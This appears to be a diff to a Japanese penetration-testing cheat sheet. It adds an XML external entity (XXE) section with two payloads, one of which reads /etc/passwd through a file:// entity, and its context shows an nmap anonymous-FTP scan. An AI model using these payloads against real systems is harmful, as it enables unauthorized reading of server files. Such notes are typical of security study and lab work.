@@ -315,3 +315,19 @@ sudo nmap -Pn --script=ftp-anon.nse <TARGET IP> -p 21
 
 - オンラインツール
   - <https://crackstation.net/>
+
+### XML外部実態攻撃
+
+#### XXE
+
+```xml
+<!DOCTYPE replace [<!ENTITY name "feast"> ]>
+<userInfo>
+  <firstName>falcon</firstName>
+  <lastName>&name;</lastName>
+</userInfo>
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM 'file:///etc/passwd'>]>
+<root>&read;</root>
+```
